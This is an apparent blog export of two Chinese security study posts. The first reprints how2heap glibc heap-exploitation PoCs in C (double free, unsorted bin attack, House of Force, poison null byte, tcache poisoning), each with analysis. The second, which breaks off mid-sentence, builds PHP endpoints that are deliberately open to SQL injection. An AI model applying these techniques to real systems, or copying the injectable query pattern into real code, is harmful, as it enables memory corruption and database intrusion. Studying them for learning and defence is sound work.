<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[how2heap学习笔记（二）]]></title>
    <url>%2F2019%2F05%2F14%2Fposthow2heap2%2F</url>
    <content type="text"><![CDATA[how2heap的学习这是接着之前的进行学习的8.fastbin_dup.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { fprintf(stderr, &quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;); fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a); fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b); fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c); fprintf(stderr, &quot;Freeing the first one...\n&quot;); free(a); fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a); // free(a); fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b); free(b); fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&apos;ll get %p twice!\n&quot;, a, b, a, a); fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, malloc(8)); fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8)); fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, malloc(8)); } 实验结果： 实验分析：这是一个简单的利用fastbin进行双重攻击的例子。首先malloc三个缓冲区，然后free（a），当我们想要再次free（a）会报错，因为a经过第一次的free后放在了fastbin的首部，不能被释放，这时候free(b)这样b代替a成为了freebin的首部，就能再次释放a了，这样就造成了重复释放。 9.unsorted_bin_attack.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(){ fprintf(stderr, &quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;); fprintf(stderr, &quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot; &quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;); unsigned long stack_var=0; fprintf(stderr, &quot;Let&apos;s first look at the target we want to rewrite on stack:\n&quot;); fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;stack_var, stack_var); unsigned long *p=malloc(400); fprintf(stderr, &quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;,p); fprintf(stderr, &quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot; &quot;the first one during the free()\n\n&quot;); malloc(500); free(p); fprintf(stderr, &quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot; &quot;point to %p\n&quot;,(void*)p[1]); //------------VULNERABILITY----------- p[1]=(unsigned long)(&amp;stack_var-2); fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;); fprintf(stderr, &quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;,(void*)p[1]); //------------------------------------ malloc(400); fprintf(stderr, &quot;Let&apos;s malloc again to get the chunk we just free. During this time, the target should have already been &quot; &quot;rewritten:\n&quot;); fprintf(stderr, &quot;%p: %p\n&quot;, &amp;stack_var, (void*)stack_var); } 实验结果： 实验分析：这个例子是通过将大的unsigned long value写入stack对unsorted bin攻击的实例。首先定义了，然后malloc了一个普通的块p（p的内存为400），（为了避免我们在free后整合顶部块，malloc了一个500的块）。接下来我们free（p），这样由于p的大小为400，所以放入unsorted bin中，p也就指向了bin的首部。接下来我们开始攻击：首先修改p[1]:p[1]=(unsigned long)(&amp;stack_var-2); 这个指令将p[1]的地址修改为target addr-16 处伪造的 chunk（这是因为stack_var-2表示减去两个地址空间，一个地址空间为8个内存）接下来我们malloc大小为400的chunk，由于unsorted bin中有，就直接取出。在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。 10.overlapping_chunks.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; int main(int argc , char* argv[]){ intptr_t *p1,*p2,*p3,*p4; fprintf(stderr, &quot;\nThis is a simple chunks overlapping problem\n\n&quot;); fprintf(stderr, &quot;Let&apos;s start to allocate 3 chunks on the heap\n&quot;); p1 = malloc(0x100 - 8); p2 = malloc(0x100 - 8); p3 = malloc(0x80 - 8); fprintf(stderr, &quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;, p1, p2, p3); memset(p1, &apos;1&apos;, 0x100 - 8); memset(p2, &apos;2&apos;, 0x100 - 8); memset(p3, &apos;3&apos;, 0x80 - 8); fprintf(stderr, &quot;\nNow let&apos;s free the chunk p2\n&quot;); free(p2); fprintf(stderr, &quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;); fprintf(stderr, &quot;Now let&apos;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;); fprintf(stderr, &quot;For a toy program, the value of the last 3 bits is unimportant;&quot; &quot; however, it is best to maintain the stability of the heap.\n&quot;); fprintf(stderr, &quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot; &quot; to assure that p1 is not mistaken for a free chunk.\n&quot;); int evil_chunk_size = 0x181; int evil_region_size = 0x180 - 8; fprintf(stderr, &quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;, evil_chunk_size, evil_region_size); *(p2-1) = evil_chunk_size; // we are overwriting the &quot;size&quot; field of chunk p2 fprintf(stderr, &quot;\nNow let&apos;s allocate another chunk with a size equal to the data\n&quot; &quot;size of the chunk p2 injected size\n&quot;); fprintf(stderr, &quot;This malloc will be served from the previously freed chunk that\n&quot; &quot;is parked in the unsorted bin which size has been modified by us\n&quot;); p4 = malloc(evil_region_size); fprintf(stderr, &quot;\np4 has been allocated at %p and ends at %p\n&quot;, (char *)p4, (char *)p4+evil_region_size); fprintf(stderr, &quot;p3 starts at %p and ends at %p\n&quot;, (char *)p3, (char *)p3+0x80-8); fprintf(stderr, &quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;); fprintf(stderr, &quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot; &quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;); fprintf(stderr, &quot;Let&apos;s run through an example. Right now, we have:\n&quot;); fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4); fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3); fprintf(stderr, &quot;\nIf we memset(p4, &apos;4&apos;, %d), we have:\n&quot;, evil_region_size); memset(p4, &apos;4&apos;, evil_region_size); fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4); fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3); fprintf(stderr, &quot;\nAnd if we then memset(p3, &apos;3&apos;, 80), we have:\n&quot;); memset(p3, &apos;3&apos;, 80); fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4); fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3); } 实验结果： 实验分析：首先分配三个块分别为p1 = malloc(0x100 - 8);p2 = malloc(0x100 - 8);p3 = malloc(0x80 - 8);然后利用menset函数将p1,p2,p3内存中的内容分别全部置为1,2,3。这时free（p2），这个时候p2就会被放在unsorted bin中，大小为p2原本malloc出来的大小。下一步我们将模仿一个可以重写到p2的溢出。虽然程序的最后三位的值是不重要的，但是我们还是要尽量保持堆的稳定性。为了实现堆得稳定性，我们将最不重要的一位标记为1（prev_inuse）来确保p不会被认为是一个free的chunk。下一步我们开始构造fakechunk。首先使用(p2-1) = evil_chunk_size;定义p2的大小，然后malloc一个大小为0x180 - 8 的p4。这时候由于被free的p2放在unsorted bin中并且大小符合，就会把p2的地分配给p4。这时候由于p3的地址大小为0x80 - 8，并且是与p2连着的，所以p4分配的地址空间中是包含p3的。接下来是代码中附带的实例：首先把p4全部设为4，我们可以发现p3中的3也变为4了。然后再将p3中的80个设为3，我们发现p3中的前一部分变为3了。p4地址中的一部分变为3，一部分保留为4。**P3中地址空间大于80是因为malloc动态分配的内存有可能大于你想要申请的大小。 11.overlapping_chunks_2.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; int main(){ intptr_t *p1,*p2,*p3,*p4,*p5,*p6; unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6; int prev_in_use = 0x1; fprintf(stderr, &quot;\nThis is a simple chunks overlapping problem&quot;); fprintf(stderr, &quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;); fprintf(stderr, &quot;\nLet&apos;s start to allocate 5 chunks on the heap:&quot;); p1 = malloc(1000); p2 = malloc(1000); p3 = malloc(1000); p4 = malloc(1000); p5 = malloc(1000); real_size_p1 = malloc_usable_size(p1); real_size_p2 = malloc_usable_size(p2); real_size_p3 = malloc_usable_size(p3); real_size_p4 = malloc_usable_size(p4); real_size_p5 = malloc_usable_size(p5); fprintf(stderr, &quot;\n\nchunk p1 from %p to %p&quot;, p1, (unsigned char *)p1+malloc_usable_size(p1)); fprintf(stderr, &quot;\nchunk p2 from %p to %p&quot;, p2, (unsigned char *)p2+malloc_usable_size(p2)); fprintf(stderr, &quot;\nchunk p3 from %p to %p&quot;, p3, (unsigned char *)p3+malloc_usable_size(p3)); fprintf(stderr, &quot;\nchunk p4 from %p to %p&quot;, p4, (unsigned char *)p4+malloc_usable_size(p4)); fprintf(stderr, &quot;\nchunk p5 from %p to %p\n&quot;, p5, (unsigned char *)p5+malloc_usable_size(p5)); memset(p1,&apos;A&apos;,real_size_p1); memset(p2,&apos;B&apos;,real_size_p2); memset(p3,&apos;C&apos;,real_size_p3); memset(p4,&apos;D&apos;,real_size_p4); memset(p5,&apos;E&apos;,real_size_p5); fprintf(stderr, &quot;\nLet&apos;s free the chunk p4.\nIn this case this isn&apos;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;); free(p4); fprintf(stderr, &quot;\nLet&apos;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;); *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE fprintf(stderr, &quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;); fprintf(stderr, &quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;); free(p2); fprintf(stderr, &quot;\nNow let&apos;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;); p6 = malloc(2000); real_size_p6 = malloc_usable_size(p6); fprintf(stderr, &quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;); fprintf(stderr, &quot;\nchunk p6 from %p to %p&quot;, p6, (unsigned char *)p6+real_size_p6); fprintf(stderr, &quot;\nchunk p3 from %p to %p\n&quot;, p3, (unsigned char *) p3+real_size_p3); fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;); fprintf(stderr, &quot;%s\n&quot;,(char *)p3); fprintf(stderr, &quot;\nLet&apos;s write something inside p6\n&quot;); memset(p6,&apos;F&apos;,1500); fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;); fprintf(stderr, &quot;%s\n&quot;,(char *)p3); } 实验结果： 实验分析：其实这个和overlapping_chunks差不多，但是为了更能了解堆重叠的问题所以我又进行了一定的研究。首先在堆上malloc5个块，然后利用malloc_usable_size函数分别取出他们的大小（虽然malloc的时候设置的地址大小为1000，但是动态分配的地址大小不一定是1000有可能会更大一点）下一步将p1，p2，p3，p4，p5分别置为ABCDE。由于p4并不是直接与上面的chunk连接的，所以我们可以free（p4）。然后我们假设chunk1有溢出，这样我们就利用（unsigned int ）（（unsigned char ）p1 + real_size_p1）= real_size_p2 + real_size_p3 + prev_in_use + sizeof（size_t） 2 ; 修改chunk2的size为 chunk 2 和 chunk 3 的大小之和，最后的 1 是标志位。这样当我们释放 chunk 2 的时候，malloc 根据这个被修改的 size 值，会以为 chunk 2 加上 chunk 3 的区域都是要释放的，然后就错误地修改了 chunk 5 的 prev_size。这样下来，我们会发现，当free 掉 chunk 2 后， chunk 2 ，chunk 3 一起被释放，接着，它发现紧邻的一块 chunk 4 也是 free 状态，就把它俩合并在了一起，组成一个大 free chunk，放进 unsorted bin 中。 chunk 5 的 prev size 也发生了变化。然后当我们申请一块新chunk的时候，会从 unsorted bin中取出一部分，比如这里我们申请一个chunk p6，就会把chunk2和chunk3中的部分放入。例子和overlapping_chunks差不多就不说明了。 12.house_of_force.c代码：/* This PoC works also with ASLR enabled. It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled. If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum ( http://phrack.org/issues/66/10.html ) Tested in Ubuntu 14.04, 64bit. */ #include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; char bss_var[] = &quot;This is a string that we want to overwrite.&quot;; int main(int argc , char* argv[]) { fprintf(stderr, &quot;\nWelcome to the House of Force\n\n&quot;); fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;); fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot; &quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;); fprintf(stderr, &quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;, bss_var); fprintf(stderr, &quot;Its current value is: %s\n&quot;, bss_var); fprintf(stderr, &quot;\nLet&apos;s allocate the first chunk, taking space from the wilderness.\n&quot;); intptr_t *p1 = malloc(256); fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - sizeof(long)*2); fprintf(stderr, &quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;); int real_size = malloc_usable_size(p1); fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;, real_size + sizeof(long)*2); fprintf(stderr, &quot;\nNow let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;); //----- VULNERABILITY ---- intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long)); fprintf(stderr, &quot;\nThe top chunk starts at %p\n&quot;, ptr_top); fprintf(stderr, &quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;); fprintf(stderr, &quot;Old size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1; fprintf(stderr, &quot;New size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); //------------------------ fprintf(stderr, &quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot; &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot; &quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;); unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top; fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot; &quot;we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size); void *new_ptr = malloc(evil_size); fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;, new_ptr - sizeof(long)*2); void* ctr_chunk = malloc(100); fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;); fprintf(stderr, &quot;malloc(100) =&gt; %p!\n&quot;, ctr_chunk); fprintf(stderr, &quot;Now, we can finally overwrite that value:\n&quot;); fprintf(stderr, &quot;... old string: %s\n&quot;, bss_var); fprintf(stderr, &quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;); strcpy(ctr_chunk, &quot;YEAH!!!&quot;); fprintf(stderr, &quot;... new string: %s\n&quot;, bss_var); } 实验结果： 实验分析：house_of_force 是一种通过改写 top chunk 的 size 字段来欺骗 malloc 返回任意地址的技术。我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。所以 top chunk 的大小会随着分配和回收不停地变化。首先我们malloc一个chunk（p1），然后假设我们构建的chunk有溢出漏洞，可以以此更改topchunk的size。然后我们使用(intptr_t )((char *)ptr_top + sizeof(long)) = -1;将size修改为一个大数。现在我们可以 malloc 一个任意大小的内存而不用调用 mmap 了。接下来 malloc 一个 chunk，使得该 chunk 刚好分配到我们想要控制的那块区域为止，这样在下一次 malloc 时，就可以返回到我们想要控制的区域了。计算方法是用目标地址减去 top chunk 地址，再减去 chunk 头的大小。这样就成功把。bss_var 给分配了出来。这个技术的缺点是会受到 ASLR 的影响，因为如果攻击者需要修改指定位置的内存，他首先需要知道当前 top chunk 的位置以构造合适的 malloc 大小来转移 top chunk。而 ASLR 将使堆内存地址随机，所以该技术还需同时配合使用信息泄漏以达成攻击。 13.poison_null_byte.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; int main() { fprintf(stderr, &quot;Welcome to poison null byte 2.0!\n&quot;); fprintf(stderr, &quot;Tested in Ubuntu 14.04 64bit.\n&quot;); fprintf(stderr, &quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;); fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc&apos;ed region with a null byte.\n&quot;); uint8_t* a; uint8_t* b; uint8_t* c; uint8_t* b1; uint8_t* b2; uint8_t* d; void *barrier; fprintf(stderr, &quot;We allocate 0x100 bytes for &apos;a&apos;.\n&quot;); a = (uint8_t*) malloc(0x100); fprintf(stderr, &quot;a: %p\n&quot;, a); int real_a_size = malloc_usable_size(a); fprintf(stderr, &quot;Since we want to overflow &apos;a&apos;, we need to know the &apos;real&apos; size of &apos;a&apos; &quot; &quot;(it may be more than 0x100 because of rounding): %#x\n&quot;, real_a_size); b = (uint8_t*) malloc(0x200); fprintf(stderr, &quot;b: %p\n&quot;, b); c = (uint8_t*) malloc(0x100); fprintf(stderr, &quot;c: %p\n&quot;, c); barrier = malloc(0x100); fprintf(stderr, &quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot; &quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;, barrier); uint64_t* b_size_ptr = (uint64_t*)(b - 8); // added fix for size==prev_size(next_chunk) check in newer versions of glibc // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30 // this added check requires we are allowed to have null pointers in b (not just a c string) //*(size_t*)(b+0x1f0) = 0x200; fprintf(stderr, &quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot; &quot;the check &apos;chunksize(P) != prev_size (next_chunk(P))&apos;\n&quot;); // we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00) // which is the value of b.size after its first byte has been overwritten with a NULL byte *(size_t*)(b+0x1f0) = 0x200; // this technique works by overwriting the size metadata of a free chunk free(b); fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr); fprintf(stderr, &quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;); fprintf(stderr, &quot;We overflow &apos;a&apos; with a single null byte into the metadata of &apos;b&apos;\n&quot;); a[real_a_size] = 0; // &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot; fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr); uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2; fprintf(stderr, &quot;c.prev_size is %#lx\n&quot;,*c_prev_size_ptr); fprintf(stderr, &quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;, *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8)))); b1 = malloc(0x100); fprintf(stderr, &quot;b1: %p\n&quot;,b1); fprintf(stderr, &quot;Now we malloc &apos;b1&apos;. It will be placed where &apos;b&apos; was. &quot; &quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;,*c_prev_size_ptr); fprintf(stderr, &quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot; &quot;before c.prev_size: %lx\n&quot;,*(((uint64_t*)c)-4)); fprintf(stderr, &quot;We malloc &apos;b2&apos;, our &apos;victim&apos; chunk.\n&quot;); // Typically b2 (the victim) will be a structure with valuable pointers that we want to control b2 = malloc(0x80); fprintf(stderr, &quot;b2: %p\n&quot;,b2); memset(b2,&apos;B&apos;,0x80); fprintf(stderr, &quot;Current b2 content:\n%s\n&quot;,b2); fprintf(stderr, &quot;Now we free &apos;b1&apos; and &apos;c&apos;: this will consolidate the chunks &apos;b1&apos; and &apos;c&apos; (forgetting about &apos;b2&apos;).\n&quot;); free(b1); free(c); fprintf(stderr, &quot;Finally, we allocate &apos;d&apos;, overlapping &apos;b2&apos;.\n&quot;); d = malloc(0x300); fprintf(stderr, &quot;d: %p\n&quot;,d); fprintf(stderr, &quot;Now &apos;d&apos; and &apos;b2&apos; overlap.\n&quot;); memset(d,&apos;D&apos;,0x300); fprintf(stderr, &quot;New b2 content:\n%s\n&quot;,b2); fprintf(stderr, &quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot; &quot;for the clear explanation of this technique.\n&quot;); } 实验结果： 实验分析：首先分别创建a,b,c三个chunk，第一个和第三个的 chunk 类型无所谓，第一个chunk存在off-by-null即可。后两个不能是 fast chunk，因为 fast chunk 在释放后不会被合并。然后malloc一个barrier作为一个障碍，防止free（c）的时候和topchunk合并。然后free（b），利用a溢出off-by-null修改freed chunk b的size=0x200，通过next_chunk宏计算可得到fake chunk。这样再次malloc会进行unlink，而glibc的chunk边界都是通过边际计算的。由于malloc的chunk全部是利用边界标记法确定，glibc会误认为fake chunk才是chunk c的头部，分配堆块后，发生变化的metadata实际是 fake c.prev_size，而不是 c.prev_size。所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x210 的 freed chunk。但其实这片内存已经被分配给了 chunk b1。两个相邻的 small chunk 被释放后会被合并在一起。首先释放 chunk b1，伪造出 fake chunk b 是 freed chunk 的样子。然后释放 chunk c，这时glibc检查chunk c的PREV_INUSE，确定 chunk c 的前一个 chunk b1 是一个 freed chunk，将计算size=prev_size+size，并触发unlink consolidate_forward。在consolidate forward的过程中，对于unlink的各项判断都是可以bypass的。从 unsorted bin 中取出来合并进入 top chunk,top chunk 上移。chunk b2 位于 chunk b1 和 chunk c 之间，被直接无视了，现在 malloc 认为这整块 区域都是未分配的，新的 top chunk 指针已经说明了一切。这样，再次malloc就可以造成d指针与b2 构成overlap。 14.tcache_dup.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { fprintf(stderr, &quot;This file demonstrates a simple double-free attack with tcache.\n&quot;); fprintf(stderr, &quot;Allocating buffer.\n&quot;); int *a = malloc(8); fprintf(stderr, &quot;malloc(8): %p\n&quot;, a); fprintf(stderr, &quot;Freeing twice...\n&quot;); free(a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p ].\n&quot;, a, a); fprintf(stderr, &quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;, malloc(8), malloc(8)); return 0; } 实验结果： 实验分析：这个代码用tcache为我们展示了简单的双重攻击。首先使用malloc分配缓冲区，然后free(a)两次，这样我们如果连续malloc两次，就会被分配相同的缓冲区。如我运行的两个malloc（8）都分配的0x557bc0723260这个地址。 15.tcache_poisoning.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; int main() { fprintf(stderr, &quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot; &quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot; &quot;The attack is very similar to fastbin corruption attack.\n\n&quot;); size_t stack_var; fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, (char *)&amp;stack_var); fprintf(stderr, &quot;Allocating 1 buffer.\n&quot;); intptr_t *a = malloc(128); fprintf(stderr, &quot;malloc(128): %p\n&quot;, a); fprintf(stderr, &quot;Freeing the buffer...\n&quot;); free(a); fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, a); fprintf(stderr, &quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot; &quot;to point to the location to control (%p).\n&quot;, sizeof(intptr_t), a, &amp;stack_var); a[0] = (intptr_t)&amp;stack_var; fprintf(stderr, &quot;1st malloc(128): %p\n&quot;, malloc(128)); fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, &amp;stack_var); intptr_t *b = malloc(128); fprintf(stderr, &quot;2nd malloc(128): %p\n&quot;, b); fprintf(stderr, &quot;We got the control\n&quot;); return 0; } 实验结果： 实验分析：这个文件演示了一个简单的tcache中毒攻击，它欺骗malloc返回指向任意位置的指针(在本例中是堆栈)。这种攻击非常类似于fastbin腐败攻击。首先想要完成这个实验返回那个定义好的stack_var的地址，要先malloc一个a，然后我们free(a)。这样在tcache的列表中就会有a的地址。然后我们使用a[0] = (intptr_t)&stack_var;重写data的前8bytes，让他指向stack_var的地址。然后malloc（128），这样tache list 就变成了stack_var的地址。]]></content>
      <tags>
        <tag>堆溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单的sql注入]]></title>
    <url>%2F2019%2F05%2F10%2F%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[SQL注入实验实验环境：·Ubuntu18.04·Nginx+php-fpm 实验过程：一、环境搭建：1.安装nginx：代码： #sudo apt-get install nginx 2.安装php-fpm：代码： #sudo apt-get install php7.2-fpm 3.安装mysql：代码： #sudo apt-get install mysql-server php7.2-mysql 4.环境配置 二、搭建mysql数据库1.创建名为test的database2.创建名为student的table（包含 id、name、score 三列） 3.向student表中赋值三、编写带有 sql 注入漏洞的接口程序、进行注入：1.根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果展示。如根据输入的学号展示姓名和分数。代码： &lt;?php $connect=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;test&quot;) or die(&quot;unable to connect&quot;); $sql=&quot;SELECT * FROM student WHERE id=&quot;.$_GET[&apos;id&apos;]; $result=mysqli_query($connect,$sql); if ($row=mysqli_fetch_assoc($result)) { echo &quot;id:&quot;.$row[&quot;id&quot;].&quot;&lt;/br&gt;&quot;; echo &quot;name:&quot;.$row[&quot;name&quot;].&quot;&lt;/br&gt;&quot;; echo &quot;score:&quot;.$row[&quot;score&quot;].&quot;&lt;/br&gt;&quot;; } ?&gt; 运行结果： 2.根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果是否为空。如输入学号，展示是否有该学生存在。代码： &lt;?php $connect=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;test&quot;) or die(&quot;unable to connect&quot;); $sql=&quot;SELECT * FROM student WHERE id=&quot;.$_GET[&apos;id&apos;]; $result=mysqli_query($connect,$sql); $row=mysqli_fetch_assoc($result); if ($row) { echo &quot;exits&quot;; } else{ echo &quot;inexistence&quot;; } ?&gt; 运行结果：1.存在的：2.不存在的：3.根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果是否为空展示在两段随机内容之间。 代码： &lt;?php $connect=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;test&quot;) or die(&quot;unable to connect&quot;); $sql=&quot;SELECT * FROM student WHERE id=&quot;.$_GET[&apos;id&apos;]; $result=mysqli_query($connect,$sql); if ($row=mysqli_fetch_assoc($result)) { echo rand().&quot; exist &quot;.rand(); } else{ echo rand().&quot; inexistence &quot;.rand(); } ?&gt; 运行结果：非空：空： 4.根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果的条件表达式结果，并将结果展示在两段随机内容之间。如入学号，展示该学生分数是否大于 60。代码： &lt;?php $connect=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;test&quot;); $sql=&quot;SELECT * FROM student WHERE id=&quot;.$_GET[&apos;id&apos;]; $result=mysqli_query($connect,$sql); $row=mysqli_fetch_assoc($result); if (!$row) { echo rand().&quot; inexistence &quot;.rand(); } else{ if ($row[&apos;score&apos;]&gt;=60) { echo rand().&quot; pass &quot;.rand(); } else{ echo rand().&quot; fail &quot;.rand(); } } ?&gt; 运行结果：由于我的score都设置的大于60，所以这里只有存不存在的区别，大家都是pass，但是第六步实验会更改score的值，那时候再展示小于60的情况 5.根据输入的参数值，拼接 SQL 查询语句并执行，但展示一个固定的结果。如如输入学号，查询是否有学生存在，然后输出固定内容。 代码： &lt;?php $connect=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;test&quot;); $sql=&quot;SELECT * FROM student WHERE id=&quot;.$_GET[&apos;id&apos;]; $result=mysqli_query($connect,$sql); $row=mysqli_fetch_assoc($result); if ($row) { echo &quot;fixed content 1&quot;; } else{ echo &quot;fixed content 2&quot;; } ?&gt; 运行结果：存在：输出 fied content 1 不存在：输出 fied content 2 6.据输入的参数值，拼接 SQL 